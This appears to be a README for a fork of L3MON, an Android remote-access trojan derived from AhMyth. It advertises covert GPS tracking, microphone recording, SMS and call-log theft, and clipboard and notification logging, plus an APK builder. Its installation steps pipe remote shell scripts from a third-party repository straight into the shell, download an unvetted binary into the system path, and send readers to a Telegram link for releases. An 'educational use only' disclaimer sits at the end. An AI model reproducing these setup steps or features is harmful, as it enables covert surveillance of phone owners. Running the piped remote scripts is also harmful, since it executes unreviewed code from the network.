# Project closed <a href="https://t.me/+egpQDeBtGk8wYWU1"> Join for 100% free tools and education </a>.
<p align="center">
<img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud-based remote Android management suite, powered by NodeJS 

</p>

<p>The only way to help us is to visit our YouTube channel and subscribe to our channel, leave your comments on our videos, and follow us on GitHub. Looking forward to your cooperation.</p>

## L3MON Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that don't use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
     - Ubuntu chroot
        - `sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre`
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)`
      - Termux 
        - `pkg update && pkg upgrade`
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) `
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh) `
        - `curl -L -o $PWD/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true -s;chmod +x emsf;mv emsf ../usr/bin/ `
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't be using this)

3. install PM2 
    - `npm install pm2 -g`
    - `npm install`
    - `npm audit fix`
    - `npm audit`
    - `npm audit fix --force`

4. Download and Extract the latest release from [HERE](https://t.me/+egpQDeBtGk8wYWU1)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. MD5 Hash `echo -n efxtv | openssl md5|awk '{print $2}'`
    4. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

7. In your browser navigate to `http://127.0.0.1:22533`

## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.

Please look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0

## Self Help
| [![Git Clone](https://github.com/efxtv/L3MON/raw/main/error-and-install/1git-clone.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/1git-clone.gif) | [![Prerequisites](https://github.com/efxtv/L3MON/raw/main/error-and-install/2prerequisites.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/2prerequisites.gif) | [![Install L3MON](https://github.com/efxtv/L3MON/raw/main/error-and-install/3install-L3MON.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/3install-L3MON.gif) |
|---|---|---|
| [![Setup Password MD5](https://github.com/efxtv/L3MON/raw/main/error-and-install/4asetup-password-md5.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/4asetup-password-md5.gif) | [![Fix Java 8 in Termux](https://github.com/efxtv/L3MON/raw/main/error-and-install/4fix-java8-in-termux.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/4fix-java8-in-termux.gif) | [![Missing mainDB.json](https://github.com/efxtv/L3MON/raw/main/error-and-install/5amissing-maindb.json.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/5amissing-maindb.json.gif) |
| [![Build](https://github.com/efxtv/L3MON/raw/main/error-and-install/5build.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/5build.gif) | [![Build Install](https://github.com/efxtv/L3MON/raw/main/error-and-install/6build-install.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/6build-install.gif) | [![Allow Permissions](https://github.com/efxtv/L3MON/raw/main/error-and-install/7allow-permissions.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/7allow-permissions.gif) |

[![Live Client](https://github.com/efxtv/L3MON/raw/main/error-and-install/8live-client.gif)](https://github.com/efxtv/L3MON/raw/main/error-and-install/8live-client.gif)
## Thanks
L3MON Builds off and utilizes several open-source software, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based on [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)

## Disclaimer
<b>D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//d3vl.com">D3VL</a></p>
<p align="center"><a href="https://t.me/+egpQDeBtGk8wYWU1">Telegram</a></p>
<p align="center" style="font-size: 8px">v1.1.2 <a href="https://github.com/D3VL/L3MON">Credit!</a></p>
